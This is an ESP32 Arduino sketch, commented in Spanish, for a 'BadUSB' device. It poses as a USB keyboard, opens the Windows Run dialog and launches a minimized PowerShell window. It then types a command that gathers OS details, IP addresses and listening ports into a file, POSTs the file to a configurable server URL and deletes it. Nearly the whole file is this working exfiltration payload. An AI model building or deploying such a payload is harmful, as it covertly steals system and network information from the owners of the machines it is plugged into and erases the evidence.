#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  // Inicializamos el teclado USB
  Keyboard.begin();
  USB.begin();
  
  // Esperamos 5 segundos para que la PC reconozca el dispositivo
  delay(5000);

  // 1. Abrimos la ventana de "Ejecutar" (Win + R)
  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r');
  delay(150);
  Keyboard.releaseAll();
  
  delay(600); // Esperamos a que abra la ventana de Ejecutar

  // 2. Invocamos a PowerShell de forma minimizada o silenciosa
  // -WindowStyle Hidden evita que la ventana se quede abierta molestando
  Keyboard.print("powershell -NoProfile -WindowStyle Minimized");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1500); // Esperamos a que cargue PowerShell de fondo

  // 3. Definimos las variables y los comandos que va a tipear el BadUSB

  // URL DEL SERVIDOR EN DONDE VIAJARA LA SOLICITUD POST.
  String url = ""; 

  // Construimos la secuencia de comandos en una sola línea
  String comando = "$p=\"$env:USERPROFILE\\conf.txt\"; "
                   "\"--- INFO --- \" > $p; "
                   "Get-ComputerInfo | Select-Object OsName, OsArchitecture >> $p; "
                   "\"--- NET --- \" >> $p; "
                   "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress >> $p; "
                   "\"--- PORTS --- \" >> $p; "
                   "Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'} | Select-Object LocalPort >> $p; "
                   "Invoke-WebRequest -Uri '" + url + "' -Method Post -InFile $p; "
                   "Remove-Item $p; exit";

  // 4. El ESP32 escribe todo el comando a máxima velocidad
  Keyboard.print(comando);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // Queda vacío para que solo se ejecute una vez al conectar el USB
}